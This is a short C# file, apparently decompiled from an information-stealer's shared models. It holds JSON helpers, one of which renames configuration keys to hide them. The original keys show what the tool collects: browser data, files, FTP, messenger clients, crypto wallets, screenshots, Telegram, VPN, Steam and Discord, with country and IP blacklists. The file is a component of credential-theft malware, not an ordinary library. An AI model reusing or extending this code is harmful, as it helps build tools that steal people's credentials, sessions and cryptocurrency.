using Newtonsoft.Json;
using System.Web.Script.Serialization;

namespace Meta.SharedModels;

public static class JsonExt
{
    private static object object_0;

    public static JavaScriptSerializer JSON
    {
        get
        {
            object obj = object_0;
            if (obj == null)
            {
                obj = new JavaScriptSerializer
                {
                    RecursionLimit = int.MaxValue,
                    MaxJsonLength = int.MaxValue
                };
                object_0 = obj;
            }
            return (JavaScriptSerializer)obj;
        }
    }

    public static T FromJSON<T>(this string @this)
    {
        try
        {
            return JsonConvert.DeserializeObject<T>(@this);
        }
        catch
        {
            return default(T);
        }
    }

    public static string ToJSON(this object @this)
    {
        return JsonConvert.SerializeObject(@this, Formatting.Indented);
    }

    public static string ToEntityJSON(this object @this)
    {
        return JSON.Serialize(@this).Replace("GrabBrowsers", "Field1").Replace("GrabFiles", "Field2")
            .Replace("GrabFTP", "Field3")
            .Replace("GrabImClients", "Field4")
            .Replace("GrabWallets", "Field5")
            .Replace("GrabUserAgent", "Field6")
            .Replace("GrabScreenshot", "Field7")
            .Replace("GrabTelegram", "Field8")
            .Replace("GrabVPN", "Field9")
            .Replace("GrabSteam", "Field10")
            .Replace("GrabPaths", "Field11")
            .Replace("BlacklistedCountry", "Field12")
            .Replace("BlacklistedIP", "Field13")
            .Replace("GrabDiscord", "Field14");
    }
}
